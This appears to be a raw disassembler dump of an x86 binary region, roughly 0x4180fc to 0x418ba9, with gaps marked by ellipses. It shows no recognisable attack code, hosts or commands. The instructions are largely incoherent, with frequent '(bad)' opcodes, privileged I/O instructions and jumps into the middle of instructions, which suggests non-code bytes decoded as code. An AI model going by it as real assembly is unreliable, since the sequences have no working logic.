  4180fc:	mov    ds:0xdb2fdebc,eax
  418101:	test   esi,esp
  418103:	push   edi
  418104:	mov    eax,0x50000fe
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    BYTE PTR [eax+0x4546f08f],bl
  418111:	jno    0x4180cf
  418113:	nop
  418114:	shl    DWORD PTR [edx],1
  418116:	jecxz  0x41817c
  418118:	iret   
  418119:	xchg   ebx,eax
  41811a:	and    BYTE PTR [ebp+0x60],0x22
  41811e:	(bad)  
  41811f:	xor    dl,BYTE PTR [ecx-0x12]
  418122:	dec    ebp
  418123:	fstp   st(7)
  418125:	imul   esi,DWORD PTR [edi-0x1b69022a],0x66b84b10
  41812f:	test   DWORD PTR [eax-0x308b98ee],esi
  418135:	xor    eax,0xf13410c6
  41813a:	or     eax,0xf930eddb
  41813f:	dec    edi
  418140:	mov    ds:0xe2274e89,al
  418145:	fs jno 0x4181b9
  418148:	ins    BYTE PTR es:[edi],dx
  418149:	scas   eax,DWORD PTR es:[edi]
  41814a:	mov    esp,0xbeba4204
  41814f:	add    eax,0x57dfddea
  418154:	or     al,BYTE PTR [bx+di-0x5a2c]
  418159:	imul   DWORD PTR [edi-0x35]
  41815c:	cwde   
  41815d:	mov    eax,0xa2aa8d6
  418162:	ror    BYTE PTR [eax+0x60c7375e],0x87
  418169:	mov    ds:0x76ed0760,al
  41816e:	mov    dh,0xcd
  418170:	cmp    bl,BYTE PTR [eax-0x1da583cd]
  418176:	xor    eax,0xafcff7dd
  41817b:	leave  
  41817c:	pop    esi
  41817d:	xor    eax,0x6eedb567
  418182:	jle    0x4181e1
  418184:	push   edi
  418185:	bound  esp,QWORD PTR [edi+0x6b]
  418188:	inc    esi
  418189:	jno    0x41814b
  41818b:	xchg   ebp,eax
  41818c:	ja     0x41813b
  41818e:	sub    DWORD PTR [esi+eiz*2+0x49c545db],edi
  418195:	stc    
  418196:	mov    al,ds:0x612cc1
  41819b:	jne    0x4181c3
  41819d:	mov    al,ds:0x76666950
  4181a2:	aam    0x8c
  4181a4:	and    BYTE PTR [ecx-0x3],bl
  4181a7:	hlt    
  4181a8:	add    BYTE PTR [eax+eax*1-0x43b4845f],cl
  4181af:	and    al,0xed
  4181b1:	stc    
  4181b2:	and    ah,BYTE PTR [ecx-0x5f]
  4181b5:	repnz ins BYTE PTR es:[edi],dx
  4181b7:	pop    eax
  4181b8:	fnsave [eax]
  4181ba:	sub    ch,BYTE PTR [edi]
  4181bc:	add    eax,0xb16f1f3a
  4181c1:	add    BYTE PTR [eax-0x2e],0x32
  4181c5:	add    bh,BYTE PTR [edi]
  4181c7:	rcl    dh,0x48
  4181ca:	pop    ebx
  4181cb:	cs popf 
  4181cd:	or     eax,0xa1ab8348
  4181d2:	fmul   DWORD PTR [eax]
  4181d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181d5:	int    0x2b
  4181d7:	dec    ebx
  4181d8:	or     al,0xf2
  4181da:	push   ebx
  4181db:	mov    ecx,0x3a643589
  4181e0:	rol    DWORD PTR [ebx+0x5880bf55],cl
  4181e6:	xchg   ebp,eax
  4181e7:	sbb    ecx,edx
  4181e9:	sub    edx,DWORD PTR [edx-0x57]
  4181ec:	sbb    eax,0x40e3ee1d
  4181f1:	in     al,dx
  4181f2:	test   eax,0xc07364b9
  4181f7:	push   esi
  4181f8:	test   DWORD PTR [eax],edi
  4181fa:	adc    DWORD PTR [edi+0x662b0498],ebx
  418200:	cmp    ebx,ecx
  418202:	sub    esi,DWORD PTR ds:0xf076aa0a
  418208:	in     al,dx
  418209:	xchg   ebp,eax
  41820a:	sar    DWORD PTR [esi+0x70],0xcc
  41820e:	pop    esi
  41820f:	mov    al,0x63
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xcf3cb8d6
  418282:	sti    
  418283:	aas    
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [edi],dl
  41828d:	push   edi
  41828e:	jmp    0x4182e6
  418290:	mov    ecx,0x3d1cca13
  418295:	mov    ch,0x82
  418297:	dec    ebp
  418298:	xor    eax,edi
  41829a:	call   0x450facec
  41829f:	sub    ebx,DWORD PTR [eax]
  4182a1:	nop
  4182a2:	jge    0x418312
  4182a4:	jmp    0xc2a0ecf3
  4182a9:	repnz sbb dh,bh
  4182ac:	jg     0x418253
  4182ae:	bound  ecx,QWORD PTR [ebx]
  4182b0:	and    al,0xad
  4182b2:	push   ecx
  4182b3:	mov    ds:0xb3848976,al
  4182b8:	xor    al,0xc
  4182ba:	mov    BYTE PTR [esi],0xd7
  4182bd:	push   ebx
  4182be:	pop    eax
  4182bf:	mov    ds:0xed00437f,eax
  4182c4:	inc    esp
  4182c5:	(bad)  
  4182c6:	in     al,0x86
  4182c8:	stos   BYTE PTR es:[edi],al
  4182c9:	and    BYTE PTR [esi-0x78d2db7],dl
  4182cf:	sahf   
  4182d0:	dec    edx
  4182d1:	mov    eax,0xaa310d70
  4182d6:	mov    dh,0xc7
  4182d8:	out    dx,al
  4182d9:	dec    esp
  4182da:	ss xor ah,cl
  4182dd:	fistp  DWORD PTR [edi]
  4182df:	hlt    
  4182e0:	inc    DWORD PTR ds:0x51ec40f7
  4182e6:	cmp    BYTE PTR [esi+0xd],ah
  4182e9:	sub    al,0xc9
  4182eb:	lock shr bh,1
  4182ee:	cmp    DWORD PTR [ecx],edi
  4182f0:	ficomp DWORD PTR [ecx-0x62]
  4182f3:	mov    ebp,0xea710abd
  4182f8:	inc    ebx
  4182f9:	mov    ecx,0x43122f1
  4182fe:	pop    es
  4182ff:	sub    edx,eax
  418301:	jnp    0x418337
  418303:	jbe    0x418367
  418305:	mov    al,ds:0x37b688e8
  41830a:	leave  
  41830b:	es gs inc eax
  41830e:	fs ins BYTE PTR es:[edi],dx
  418310:	leave  
  418311:	push   esi
  418312:	iret   
  418313:	mov    WORD PTR [edx-0x9],fs
  418316:	call   0xe73446c7
  41831b:	push   ds
  41831c:	in     al,dx
  41831d:	jo     0x41839e
  41831f:	jb     0x4182c8
  418321:	shl    ah,0x9b
  418324:	push   edx
  418325:	jne    0x41837b
  418327:	dec    ecx
  418328:	sbb    edi,ecx
  41832a:	icebp  
  41832b:	xor    DWORD PTR [esp+edi*2-0x42107727],esp
  418332:	cmp    eax,0xa83dbd
  418337:	shl    DWORD PTR [ebx+0x4f],0x23
  41833b:	pushf  
  41833c:	lahf   
  41833d:	ficomp DWORD PTR fs:[eax-0x39]
  418341:	mov    DWORD PTR [edx],edi
  418343:	mov    edx,0x6ec70833
  418348:	scas   al,BYTE PTR es:[edi]
  418349:	xchg   ecx,eax
  41834a:	sub    DWORD PTR [esi],esp
  41834c:	push   eax
  41834d:	inc    eax
  41834e:	test   al,0x51
  418350:	out    0x9d,al
  418352:	dec    ebx
  418353:	mov    esp,0xcbc6e01c
  418358:	shl    esp,1
  41835a:	jno    0x41835c
  41835c:	add    BYTE PTR [esi+eax*4+0x1f],dl
  418360:	pop    esi
  418361:	jb     0x418390
  418363:	adc    BYTE PTR [ebp+0x3e],al
  418366:	add    BYTE PTR [ecx],0x55
  418369:	outs   dx,DWORD PTR ds:[esi]
  41836a:	(bad)  
  41836b:	enter  0xcb0a,0x52
  41836f:	sub    esi,esp
  418371:	hlt    
  418372:	ss (bad) 
  418374:	xor    dl,al
  418376:	add    al,dh
  418378:	jne    0x418357
  41837a:	inc    ecx
  41837b:	xchg   DWORD PTR [edx-0x20c73e2a],edx
  418381:	push   0x4e
  418383:	inc    edx
  418384:	lock retf 0x9713
  418388:	sbb    eax,0xeb06477e
  41838d:	fs push ecx
  41838f:	retf   0x99
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	mov    ebp,DWORD PTR [ebp+0xc2dd62]
  418406:	add    DWORD PTR [eax],eax
  418408:	add    eax,0xba000001
  41840d:	(bad)  
  41840e:	cld    
  41840f:	ins    BYTE PTR es:[edi],dx
  418410:	cmp    ecx,eax
  418412:	popf   
  418413:	imul   edi,DWORD PTR [ebx+esi*4-0x19],0x86ab167a
  41841b:	adc    DWORD PTR [ebx+0x55],ebx
  41841e:	retf   0xdc82
  418421:	nop
  418422:	cs xor eax,0x7e40332f
  418428:	shl    BYTE PTR [ebx-0x5b],0x25
  41842c:	int3   
  41842d:	or     edx,DWORD PTR [eax+ebx*2+0x50]
  418431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418432:	fstp   DWORD PTR [esi]
  418434:	push   ebx
  418435:	mov    eax,ds:0xaaf68618
  41843a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41843b:	jo     0x418453
  41843d:	xchg   esi,eax
  41843e:	mov    bh,0x71
  418440:	jnp    0x418405
  418442:	shl    esi,1
  418444:	push   ss
  418445:	mov    esp,0x108d9906
  41844a:	cdq    
  41844b:	aam    0x3a
  41844d:	clc    
  41844e:	or     DWORD PTR ds:0xe3d1fd92,esp
  418454:	jae    0x418415
  418456:	repz pop DWORD PTR [eax-0x75]
  41845a:	jne    0x4184ca
  41845c:	mov    cl,0x30
  41845e:	jmp    0xfd1c:0x3b51fac1
  418465:	test   eax,0x6fb6208f
  41846a:	mov    esp,0xa6bab4a3
  41846f:	daa    
  418470:	or     al,0x70
  418472:	add    DWORD PTR [ebx],0xffffffd7
  418475:	push   0x46dd9a2e
  41847a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41847b:	ins    BYTE PTR es:[edi],dx
  41847c:	push   ecx
  41847d:	add    dh,dh
  41847f:	mov    bh,0xae
  418481:	sbb    ecx,ebp
  418483:	xchg   ecx,eax
  418484:	xor    eax,0x7321555
  418489:	shl    BYTE PTR [eax],cl
  41848b:	das    
  41848c:	shl    BYTE PTR [edx-0x12bc460c],0xd3
  418493:	sar    DWORD PTR [esi-0x3ff9a588],1
  418499:	jae    0x4184bb
  41849b:	mov    ebp,0x60107d7a
  4184a0:	adc    DWORD PTR [edx+esi*1],esp
  4184a3:	in     al,dx
  4184a4:	cmp    cl,BYTE PTR [eax+ebx*2-0x44b1b48b]
  4184ab:	mov    ebp,0x9b516b30
  4184b0:	retf   
  4184b1:	pop    edx
  4184b2:	mov    ds:0xb7b5a76a,eax
  4184b7:	adc    al,0xf4
  4184b9:	xchg   ecx,eax
  4184ba:	sbb    eax,0x643bad72
  4184bf:	inc    ebx
  4184c0:	repnz or bl,bl
  4184c3:	jns    0x418462
  4184c5:	or     al,0x6
  4184c7:	popf   
  4184c8:	shl    DWORD PTR [ecx+0x71],0xb5
  4184cc:	pop    edi
  4184cd:	test   BYTE PTR [eax-0x303766e3],ch
  4184d3:	inc    ebx
  4184d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184d5:	sbb    ah,cl
  4184d7:	retf   
  4184d8:	mov    bl,0x18
  4184da:	aas    
  4184db:	ins    BYTE PTR es:[edi],dx
  4184dc:	(bad)  
  4184dd:	mov    edx,0x33369139
  4184e2:	inc    esi
  4184e3:	gs popf 
  4184e5:	icebp  
  4184e6:	rol    BYTE PTR [ebx+0x2ba2327a],cl
  4184ec:	inc    eax
  4184ed:	xor    bh,bh
  4184ef:	and    esp,DWORD PTR [esi-0x675e83d0]
  4184f5:	inc    ebx
  4184f6:	push   es
  4184f7:	div    ecx
  4184f9:	retf   
  4184fa:	pop    ss
  4184fb:	jne    0x418487
  4184fd:	test   al,0x7f
  4184ff:	mov    edx,0xfddf5843
  418504:	enter  0xbdf9,0xb6
  418508:	sbb    DWORD PTR [ecx-0x45],ecx
  41850b:	mov    esp,0x13f8f9e0
  418510:	inc    ecx
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	mov    dh,0xe3
  418582:	push   esi
  418583:	test   edi,eax
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR ds:0x95000001,al
  41858d:	xchg   esp,eax
  41858e:	arpl   WORD PTR [ecx-0x24eacfa],di
  418594:	lods   al,BYTE PTR ds:[esi]
  418595:	outs   dx,DWORD PTR ds:[esi]
  418596:	mov    WORD PTR [edx],es
  418598:	xor    BYTE PTR [esp+ebp*8],bh
  41859b:	sbb    DWORD PTR [eax+0x48cf1542],ecx
  4185a1:	push   ebp
  4185a2:	arpl   WORD PTR [eax-0xd],di
  4185a5:	mov    dh,0x68
  4185a7:	mov    edi,DWORD PTR [ebx-0x45]
  4185aa:	mov    bl,dh
  4185ac:	jmp    0x4185a7
  4185ae:	std    
  4185af:	and    DWORD PTR [ebp-0x36646844],esi
  4185b5:	enter  0xe222,0xe1
  4185b9:	jge    0x41858b
  4185bb:	and    eax,0xe3aea193
  4185c0:	push   ebx
  4185c1:	mov    cl,0x17
  4185c3:	out    dx,al
  4185c4:	outs   dx,BYTE PTR ds:[esi]
  4185c5:	ins    DWORD PTR es:[edi],dx
  4185c6:	into   
  4185c7:	pop    esi
  4185c8:	push   edx
  4185c9:	cld    
  4185ca:	fsub   QWORD PTR [eax-0x7e1c6608]
  4185d0:	push   edi
  4185d1:	and    ecx,DWORD PTR [edx-0x35]
  4185d4:	pop    ss
  4185d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185d6:	dec    ecx
  4185d7:	xchg   ebp,eax
  4185d8:	pop    edx
  4185d9:	sub    eax,0xb27cab9f
  4185de:	jb     0x41857e
  4185e0:	jl     0x4185b8
  4185e2:	mov    dl,0x9a
  4185e4:	pop    ebp
  4185e5:	scas   al,BYTE PTR es:[edi]
  4185e6:	pop    ds
  4185e7:	mov    ah,BYTE PTR [edi+0x1cf0d245]
  4185ed:	sbb    al,0x7d
  4185ef:	sub    esi,DWORD PTR [edi+0x2983576b]
  4185f5:	loopne 0x418675
  4185f7:	(bad)  
  4185f8:	sbb    eax,ebp
  4185fa:	cmp    DWORD PTR [eax-0x73],0x52
  4185fe:	push   esi
  4185ff:	fs and al,0xca
  418602:	stc    
  418603:	adc    dl,cl
  418605:	sbb    dl,BYTE PTR [ebx+esi*2]
  418608:	adc    BYTE PTR [edx*1+0x36c1be3a],0x8
  418610:	std    
  418611:	(bad)  
  418612:	jmp    0x4185fa
  418614:	cmp    DWORD PTR [eax-0x6f],ebx
  418617:	dec    edi
  418618:	mov    ecx,0x4058ce8f
  41861d:	out    0xb0,eax
  41861f:	test   BYTE PTR [ebx+0x319a84a2],dh
  418625:	adc    dl,BYTE PTR [ebp+0x31]
  418628:	mov    bl,0x10
  41862a:	lock mov dh,0x1e
  41862d:	mov    ?,WORD PTR [ebp-0x3e]
  418630:	ds pop es
  418632:	imul   esi,esp,0x36
  418635:	sbb    al,0xba
  418637:	ss add eax,0xeb0c2e51
  41863d:	inc    edx
  41863e:	out    0x8,eax
  418640:	mov    cl,0x60
  418642:	pop    ecx
  418643:	xchg   edx,eax
  418644:	sub    bh,ch
  418646:	push   cs
  418647:	lahf   
  418648:	sub    eax,DWORD PTR [eax+ebp*4-0x45caf5de]
  41864f:	arpl   WORD PTR [edx-0x72],ax
  418652:	xchg   ecx,eax
  418653:	call   0x44fe:0xf545112c
  41865a:	push   ss
  41865b:	scas   al,BYTE PTR es:[edi]
  41865c:	pop    esi
  41865d:	syscall 
  41865f:	aaa    
  418660:	je     0x418636
  418662:	inc    edi
  418663:	je     0x4186a2
  418665:	push   ds
  418666:	jmp    0x4186a4
  418668:	push   esp
  418669:	add    bl,BYTE PTR [ebp+0x6a]
  41866c:	cmp    eax,0x7e7195a6
  418671:	addr16 into 
  418673:	sub    dl,ah
  418675:	test   BYTE PTR [eax],dh
  418677:	xchg   BYTE PTR [edi-0x40],dh
  41867a:	adc    BYTE PTR [ecx],dl
  41867c:	fstp   DWORD PTR [edx-0x1b]
  41867f:	aad    0x4b
  418681:	hlt    
  418682:	jmp    0x418651
  418684:	lds    ebx,FWORD PTR [ecx+ecx*8+0xe]
  418688:	arpl   WORD PTR [ecx+0x20967bb0],sp
  41868e:	js     0x4186a3
  418690:	fild   WORD PTR [eax]
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	call   0x102:0xcc3e2acd
  418707:	add    BYTE PTR ds:0x84000001,al
  41870d:	retf   
  41870e:	fistp  WORD PTR [ecx+0x4d2bdf6a]
  418714:	push   edx
  418715:	pusha  
  418716:	mov    BYTE PTR [ecx+0x70b19f9d],al
  41871c:	cmp    al,0x90
  41871e:	js     0x418781
  418720:	sub    BYTE PTR [edx],0xe0
  418723:	sub    dl,dl
  418725:	out    dx,al
  418726:	mov    ecx,0xf89c691
  41872b:	std    
  41872c:	pop    ecx
  41872d:	mov    bl,0xa9
  41872f:	fistp  DWORD PTR [ebx+0x44]
  418732:	or     DWORD PTR [eax+0x4778c685],eax
  418738:	(bad)  
  418739:	jmp    0x41874b
  41873b:	cld    
  41873c:	(bad)  
  41873d:	mov    ecx,0xef953d08
  418742:	push   esi
  418743:	call   0x6c988109
  418748:	mov    WORD PTR [ebx+ebx*2],?
  41874b:	ficomp DWORD PTR ds:0xf4a91b29
  418751:	es xor eax,0xcbf448c3
  418757:	imul   esi,DWORD PTR [esi],0xffffffd3
  41875a:	lds    edi,FWORD PTR [ecx+0x25]
  41875d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41875e:	add    eax,0xff80efb3
  418763:	xor    BYTE PTR [edx+0x61],al
  418766:	mov    esp,DWORD PTR [bx+si+0x4]
  41876a:	jns    0x4187c6
  41876c:	pusha  
  41876d:	push   ds
  41876e:	rcr    BYTE PTR [ecx+0x7a],0x95
  418772:	mov    eax,ds:0x5c978532
  418777:	iret   
  418778:	(bad)  
  418779:	push   esp
  41877a:	inc    ecx
  41877b:	add    DWORD PTR [edx-0x77],ebp
  41877e:	mov    dl,0x3d
  418780:	xor    BYTE PTR cs:[edi+0x40],bh
  418784:	jae    0x418744
  418786:	fldcw  WORD PTR [esi]
  418788:	sub    DWORD PTR [edx+0x5f2a0407],0x9fca4859
  418792:	xchg   ebx,eax
  418793:	sbb    esp,DWORD PTR [edi]
  418795:	call   0x798c:0xda8bc7a0
  41879c:	push   es
  41879d:	sub    BYTE PTR [eax-0x39],0x49
  4187a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187a2:	dec    BYTE PTR [esi]
  4187a4:	xchg   edx,eax
  4187a5:	jge    0x4187d1
  4187a7:	add    al,0xce
  4187aa:	outs   dx,BYTE PTR ds:[esi]
  4187ab:	fldenv [eax+0x2b5ace3d]
  4187b1:	xchg   ebx,eax
  4187b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b3:	in     eax,0xb5
  4187b5:	pop    ds
  4187b6:	aaa    
  4187b7:	mov    eax,0xa550f642
  4187bc:	sub    esp,DWORD PTR [ebp-0x2f]
  4187bf:	lds    ebp,FWORD PTR [ebx+0x735488be]
  4187c5:	adc    edx,DWORD PTR [ebp-0x5d483e26]
  4187cb:	iret   
  4187cc:	leave  
  4187cd:	push   ss
  4187ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187cf:	inc    ebp
  4187d0:	popf   
  4187d1:	jp     0x4187c8
  4187d3:	pop    ds
  4187d4:	int    0x1d
  4187d6:	ins    DWORD PTR es:[edi],dx
  4187d7:	pop    bx
  4187d9:	jecxz  0x418770
  4187db:	not    esi
  4187dd:	fdivr  QWORD PTR [ebx]
  4187df:	les    ebp,FWORD PTR [edi-0x1c]
  4187e2:	out    dx,eax
  4187e3:	jb     0x418858
  4187e5:	dec    esi
  4187e6:	sbb    bl,al
  4187e8:	pop    esp
  4187e9:	jecxz  0x4187ab
  4187eb:	adc    DWORD PTR [edi],0x685db1a5
  4187f1:	mov    ch,0xdb
  4187f3:	out    dx,eax
  4187f4:	xchg   esp,eax
  4187f5:	xor    BYTE PTR [esi+0x519e12b5],ah
  4187fb:	or     esi,DWORD PTR [ebx-0x3a]
  4187fe:	mov    DWORD PTR [ecx-0x36],eax
  418801:	lea    edi,[ebp+0x3fdb087f]
  418807:	and    cl,bl
  418809:	test   eax,0x9858ce61
  41880e:	lahf   
  41880f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418810:	add    DWORD PTR [eax],0x0
	...
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x6c63c533]
  418881:	ret    0x1c5a
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0xfd000001
  41888d:	mov    bl,0xa
  41888f:	adc    eax,0x26b2fd97
  418894:	fadd   QWORD PTR [eax+0x523cfe3f]
  41889a:	in     al,0xe9
  41889c:	adc    bh,BYTE PTR [edi]
  41889e:	or     ch,dh
  4188a0:	in     al,0xb
  4188a2:	(bad)  
  4188a3:	outs   dx,BYTE PTR ds:[esi]
  4188a4:	mov    ecx,0xfe459ba0
  4188a9:	popf   
  4188aa:	test   eax,0x3ac4cb87
  4188af:	scas   eax,DWORD PTR es:[edi]
  4188b0:	test   BYTE PTR [esi+0xc],dh
  4188b3:	mov    edi,0x10157d91
  4188b8:	cld    
  4188b9:	mov    ds:0x7556a6d4,al
  4188be:	jb     0x418929
  4188c0:	bound  edx,QWORD PTR [edx+0x5b]
  4188c3:	add    al,0xb2
  4188c5:	lds    esp,FWORD PTR [ebx]
  4188c7:	pop    ebx
  4188c8:	data16 xlat BYTE PTR fs:[ebx]
  4188cb:	push   esp
  4188cc:	xor    esp,eax
  4188ce:	push   esi
  4188cf:	(bad)  
  4188d0:	out    dx,eax
  4188d1:	aam    0x39
  4188d3:	cdq    
  4188d4:	into   
  4188d5:	add    DWORD PTR [eax*1+0x4af46e48],0xffffffe3
  4188dd:	jmp    0xb9c507dd
  4188e2:	stos   BYTE PTR es:[edi],al
  4188e3:	pop    es
  4188e4:	mul    BYTE PTR [esi-0x198ec962]
  4188ea:	outs   dx,BYTE PTR ds:[esi]
  4188eb:	nop
  4188ec:	mov    esi,0x35418c50
  4188f1:	or     BYTE PTR [edx+0x3b4871e7],cl
  4188f7:	scas   al,BYTE PTR es:[edi]
  4188f8:	or     eax,0x3847a902
  4188fd:	jne    0x41890f
  4188ff:	mov    dl,0x9f
  418901:	add    al,0x8b
  418903:	dec    edx
  418904:	sti    
  418905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418906:	mov    ebp,DWORD PTR [eax+0x1306bf5a]
  41890c:	gs aam 0x65
  41890f:	cmp    edi,ecx
  418911:	mov    ebp,0xf9e03f58
  418916:	sbb    eax,edx
  418918:	push   esi
  418919:	arpl   WORD PTR [ecx-0x51cdae98],sp
  41891f:	inc    eax
  418920:	ins    BYTE PTR es:[edi],dx
  418921:	push   edx
  418922:	loopne 0x418914
  418924:	fiadd  WORD PTR [esp+edi*1]
  418927:	mov    bh,0xb1
  418929:	addr16 mov ebp,0x823bc3eb
  41892f:	or     al,0xd6
  418931:	sbb    eax,0x80316bcf
  418936:	jne    0x418923
  418938:	mov    WORD PTR [edi-0x1a],gs
  41893b:	jae    0x418919
  41893d:	mov    ah,0x83
  41893f:	or     dl,BYTE PTR [eax+0x4b856ce0]
  418945:	ja     0x418966
  418947:	adc    bh,bl
  418949:	pop    ss
  41894a:	add    eax,0x46fbd6fb
  41894f:	mov    WORD PTR [ecx-0x4b],fs
  418952:	cmp    eax,0xcf1c5c46
  418957:	ds push ecx
  418959:	mov    edx,0xb589c6d5
  41895e:	lock xacquire adc DWORD PTR [eax+0x137d4b45],0x9a46632a
  41896a:	adc    DWORD PTR [ecx+0x6d],esp
  41896d:	(bad)  
  41896e:	sti    
  41896f:	cmp    eax,0xda5069
  418974:	ss (bad) 
  418976:	test   DWORD PTR [ecx],0x9687b200
  41897c:	repz cmp al,0x80
  41897f:	xor    al,0xd5
  418981:	aaa    
  418982:	es jp  0x41897b
  418985:	fcomp  DWORD PTR [esi-0x6a418b61]
  41898b:	dec    eax
  41898c:	add    DWORD PTR [edi+0xaa9781],0x0
	...
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x97406269
  418a03:	(bad)  
  418a04:	(bad)  
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0x15000001,al
  418a0d:	inc    BYTE PTR [esi]
  418a0f:	add    DWORD PTR [edx-0x1cbdcac7],esp
  418a15:	jge    0x418a0e
  418a17:	inc    edi
  418a18:	pusha  
  418a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1a:	jge    0x418a74
  418a1c:	aad    0x4c
  418a1e:	addr16 out dx,al
  418a20:	cmp    DWORD PTR [eax-0x97372f1],ecx
  418a26:	dec    esi
  418a27:	jne    0x418a3a
  418a29:	popa   
  418a2a:	cmp    BYTE PTR [ecx+0x4772eada],dl
  418a30:	jae    0x4189b3
  418a32:	in     al,dx
  418a33:	add    eax,0xaaf5c9dd
  418a38:	and    al,0x19
  418a3a:	sti    
  418a3b:	sbb    DWORD PTR [esi],eax
  418a3d:	cmp    ebp,DWORD PTR [ecx+edx*4-0x55]
  418a41:	ffreep st(3)
  418a43:	call   0xf681:0x2e405db1
  418a4a:	leave  
  418a4b:	ret    
  418a4c:	mov    ebx,DWORD PTR [ecx-0x4]
  418a4f:	repnz fstp TBYTE PTR [edx-0x61]
  418a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a54:	push   0xc78aa1aa
  418a59:	loope  0x418a44
  418a5b:	mov    ch,0x42
  418a5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5e:	lods   al,BYTE PTR ds:[esi]
  418a5f:	xchg   edx,eax
  418a60:	icebp  
  418a61:	popa   
  418a62:	gs pop eax
  418a64:	sbb    eax,0x4191988c
  418a69:	out    dx,al
  418a6a:	(bad)  
  418a6b:	into   
  418a6c:	and    BYTE PTR [eax-0x1],ch
  418a6f:	mov    ds:0xe1e40c0c,al
  418a74:	fwait
  418a75:	dec    esi
  418a76:	pop    ebx
  418a77:	cli    
  418a78:	pop    ebp
  418a79:	add    bl,BYTE PTR [ebx-0x72f91b9c]
  418a7f:	(bad)  
  418a80:	sbb    BYTE PTR [edi-0x39b9fee5],0x9c
  418a87:	xlat   BYTE PTR ds:[ebx]
  418a88:	push   ecx
  418a89:	and    al,0xdd
  418a8b:	push   0x6f73fbec
  418a90:	iret   
  418a91:	sar    BYTE PTR [ecx-0x56c3fc26],cl
  418a97:	ss (bad) 
  418a99:	fcomip st,st(3)
  418a9b:	jp     0x418aae
  418a9d:	je     0x418b12
  418a9f:	xchg   ecx,eax
  418aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aa1:	xchg   ebx,eax
  418aa2:	mov    cl,0x9c
  418aa4:	fdiv   QWORD PTR [ebx-0x439921a0]
  418aaa:	push   edx
  418aab:	push   ebx
  418aac:	and    edi,DWORD PTR [edi]
  418aae:	or     al,ah
  418ab0:	fisttp WORD PTR [eax+0x12]
  418ab3:	scas   eax,DWORD PTR es:[edi]
  418ab4:	mov    edi,0x76d64ea9
  418ab9:	fwait
  418aba:	sub    ch,BYTE PTR [ecx-0x5865469a]
  418ac0:	mov    ds:0x5ea622f6,eax
  418ac5:	mov    ds:0xe308a9d5,al
  418aca:	jle    0x418a5f
  418acc:	nop
  418acd:	icebp  
  418ace:	mov    edx,0x1c66632d
  418ad3:	push   esi
  418ad4:	scas   al,BYTE PTR es:[edi]
  418ad5:	mov    bh,0x3a
  418ad7:	test   DWORD PTR [edx-0x45],ebp
  418ada:	and    BYTE PTR [esi-0x5e],0xe0
  418ade:	mov    bh,0x8d
  418ae0:	ror    DWORD PTR [edi+0x61b02f3b],cl
  418ae6:	loope  0x418b28
  418ae8:	dec    edi
  418ae9:	mov    eax,edi
  418aeb:	push   edx
  418aec:	mov    ch,0x33
  418aee:	mov    esi,0xf0e86916
  418af3:	mov    edi,0x776582ac
  418af8:	sbb    eax,0x4c86e0b
  418afd:	clc    
  418afe:	imul   ecx,eax,0x10
  418b01:	repz sub eax,0x89dec486
  418b07:	jo     0x418b0a
  418b09:	jo     0x418b63
  418b0b:	call   0x714adf44
  418b10:	daa    
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x2b
  418b81:	repz std 
  418b83:	push   edx
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	leave  
  418b8d:	das    
  418b8e:	data16 mov BYTE PTR [edi],al
  418b91:	inc    ecx
  418b92:	aad    0x61
  418b94:	push   es
  418b95:	dec    esi
  418b96:	and    DWORD PTR ds:0x920e7e95,0xfd9f4e70
  418ba0:	lea    edx,[ebx]
  418ba2:	xchg   BYTE PTR [edi],bl
  418ba4:	push   0xae43c671
  418ba9:	out    dx,eax
